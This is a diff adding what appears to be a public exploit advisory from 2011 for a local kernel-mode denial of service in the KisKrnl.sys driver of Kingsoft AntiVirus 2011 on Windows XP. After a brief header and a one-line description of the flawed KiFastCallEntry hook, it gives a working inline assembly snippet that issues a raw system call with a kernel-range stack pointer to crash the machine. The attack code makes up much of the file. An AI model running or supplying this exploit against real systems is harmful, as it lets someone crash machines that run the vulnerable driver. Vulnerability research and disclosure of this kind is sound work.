@@ -1,0 +1,18 @@
+# Kingsoft AntiVirus 2011 SP5.2 KisKrnl.sys <= 2011.1.13.89 Local Kernel Mode D.O.S Exploit
+# Date: 2011-1-16
+# Author: MJ0011
+# Software Link: http://cd001.www.duba.net/duba/install/2011/once/KAV110114_DOWN_9_13.exe
+# Version: KingSoft AntiVirus 2011 SP5.2 with KisKrnl.sys <=2011.1.13.89
+# Tested on: Windows XP SP3
+
+DETAILS:
+KisKrnl.sys hook the kernel function KiFastCallEntry , but is not correctly handle user stack pointer
+
+EXPLOIT CODE:
+
+__asm
+{
+mov edx , 0x80000000
+mov eax , 0x101        ;id of NtTerminateProcess under Windows XP 
+int 0x2e
+}
